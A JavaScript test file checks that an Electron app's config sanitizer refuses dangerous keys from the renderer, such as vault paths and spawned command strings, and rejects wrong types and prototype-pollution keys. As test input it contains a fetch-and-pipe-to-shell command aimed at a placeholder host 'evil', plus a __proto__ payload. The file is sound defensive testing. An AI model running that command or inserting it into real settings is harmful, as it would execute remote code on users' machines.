'use strict'

/* What `config:set` will and will not write. The interesting cases are the
   refusals: a key that reaches config unchecked is a renderer that can move the
   vault or choose what gets spawned, and a key wrongly refused is a setting
   that silently does not stick. Both are quiet failures, so both are asserted.
*/

const assert = require('node:assert/strict')
const { CONFIG_KEYS, sanitizeConfigPatch } = require('../electron/config-keys')

let passed = 0
function ok (what, fn) {
  fn()
  passed++
  console.log(`ok - ${what}`)
}

/* ------------------------------------------------------ the dangerous keys */

ok('the vault path cannot be set from the renderer', () => {
  const { accepted, rejected } = sanitizeConfigPatch({ vaultPath: '/tmp/elsewhere' })
  assert.deepEqual(accepted, {})
  assert.deepEqual(rejected, ['vaultPath'])
})

ok('the default vault path cannot be set either', () => {
  const { accepted } = sanitizeConfigPatch({ defaultVaultPath: '/tmp/elsewhere' })
  assert.deepEqual(accepted, {})
})

ok('the spawned command strings cannot be set', () => {
  const { accepted, rejected } = sanitizeConfigPatch({
    tikzCommand: 'sh -c "curl evil | sh"',
    manimCommand: 'sh -c "curl evil | sh"',
    pythonInstaller: 'sh -c "curl evil | sh"'
  })
  assert.deepEqual(accepted, {})
  assert.deepEqual(rejected.sort(), ['manimCommand', 'pythonInstaller', 'tikzCommand'])
})

ok('a legitimate key alongside a refused one still lands', () => {
  const { accepted, rejected } = sanitizeConfigPatch({ theme: 'dark', vaultPath: '/tmp/x' })
  assert.deepEqual(accepted, { theme: 'dark' })
  assert.deepEqual(rejected, ['vaultPath'])
})

/* --------------------------------------------------------------- the shape */

ok('a key of the wrong type is refused, not coerced', () => {
  // zoom reaches real arithmetic in main; a string here would propagate.
  const { accepted, rejected } = sanitizeConfigPatch({ zoom: '3' })
  assert.deepEqual(accepted, {})
  assert.deepEqual(rejected, ['zoom'])
  assert.deepEqual(sanitizeConfigPatch({ zoom: 1.5 }).accepted, { zoom: 1.5 })
})

ok('a non-finite number is refused', () => {
  assert.deepEqual(sanitizeConfigPatch({ zoom: NaN }).accepted, {})
  assert.deepEqual(sanitizeConfigPatch({ zoom: Infinity }).accepted, {})
})

ok('a list of paths must be a list of strings', () => {
  assert.deepEqual(sanitizeConfigPatch({ tabs: ['a.md', 'b.md'] }).accepted, { tabs: ['a.md', 'b.md'] })
  assert.deepEqual(sanitizeConfigPatch({ tabs: 'a.md' }).accepted, {})
  assert.deepEqual(sanitizeConfigPatch({ tabs: ['a.md', 3] }).accepted, {})
})

ok('the locked files are a list of paths, and the CSV lattice a boolean', () => {
  assert.deepEqual(
    sanitizeConfigPatch({ lockedFiles: ['Notes/Done.md'] }).accepted,
    { lockedFiles: ['Notes/Done.md'] })
  // A lock that does not stick is a file that quietly starts taking edits
  // again, so the wrong shape is refused rather than half-read.
  assert.deepEqual(sanitizeConfigPatch({ lockedFiles: 'Notes/Done.md' }).accepted, {})
  assert.deepEqual(sanitizeConfigPatch({ lockedFiles: ['a.md', 7] }).accepted, {})
  assert.deepEqual(sanitizeConfigPatch({ csvBorders: true }).accepted, { csvBorders: true })
  assert.deepEqual(sanitizeConfigPatch({ csvBorders: 'on' }).accepted, {})
})

ok('undefined clears the keys that are allowed to be cleared', () => {
  const { accepted } = sanitizeConfigPatch({ lastNote: undefined })
  assert.ok('lastNote' in accepted)
  assert.equal(accepted.lastNote, undefined)
  // …but not the ones that always have a value.
  assert.deepEqual(sanitizeConfigPatch({ theme: undefined }).accepted, {})
})

/* ------------------------------------------------------------ the plumbing */

ok('prototype keys are refused', () => {
  const patch = JSON.parse('{"__proto__": {"polluted": true}, "constructor": 1}')
  const { accepted } = sanitizeConfigPatch(patch)
  assert.deepEqual(accepted, {})
  assert.equal({}.polluted, undefined)
})

ok('a patch that is not an object yields nothing', () => {
  for (const bad of [null, undefined, 'theme', 42, ['theme'], true]) {
    assert.deepEqual(sanitizeConfigPatch(bad), { accepted: {}, rejected: [] })
  }
})

ok('inherited properties are not accepted', () => {
  const patch = Object.create({ theme: 'dark' })
  assert.deepEqual(sanitizeConfigPatch(patch).accepted, {})
})

/* ------------------------------------------------ the list itself is sound */

ok('every key has a callable check', () => {
  for (const [key, check] of Object.entries(CONFIG_KEYS)) {
    assert.equal(typeof check, 'function', `${key} has no check`)
  }
})

ok('autosave is a delay in milliseconds, not a switch', () => {
  // The renderer reads `Number(cfg.autosave) || 600`; a boolean here would
  // have made `true` a one-millisecond autosave.
  assert.ok(CONFIG_KEYS.autosave(600))
  assert.ok(CONFIG_KEYS.autosave(undefined), 'clearing it is allowed')
  assert.ok(!CONFIG_KEYS.autosave(true))
  assert.ok(!CONFIG_KEYS.autosave('600'))
})

ok('the keys main reads for itself are all settable or deliberately absent', () => {
  // Read by main. The first group is settable; the second must never be.
  for (const key of ['zoom', 'pdfText', 'texEngine', 'historyInVault', 'manimQuality',
    'autoInstallPythonDeps']) {
    assert.ok(key in CONFIG_KEYS, `${key} should be settable`)
  }
  for (const key of ['vaultPath', 'defaultVaultPath', 'tikzCommand', 'manimCommand', 'trustedVaults',
    'pythonInstaller']) {
    assert.ok(!(key in CONFIG_KEYS), `${key} must not be settable from the renderer`)
  }
})

ok('hotkeys accept only a flat record of strings', () => {
  assert.deepEqual(
    sanitizeConfigPatch({ hotkeys: { 'run-file': 'Cmd+R', sidebar: '' } }).accepted,
    { hotkeys: { 'run-file': 'Cmd+R', sidebar: '' } })
  assert.deepEqual(sanitizeConfigPatch({ hotkeys: { save: 3 } }).accepted, {})
  assert.deepEqual(sanitizeConfigPatch({ hotkeys: ['Cmd+R'] }).accepted, {})
  assert.deepEqual(sanitizeConfigPatch({ hotkeys: undefined }).accepted, { hotkeys: undefined })
})

console.log(`\nconfig keys: ${passed}/${passed}`)

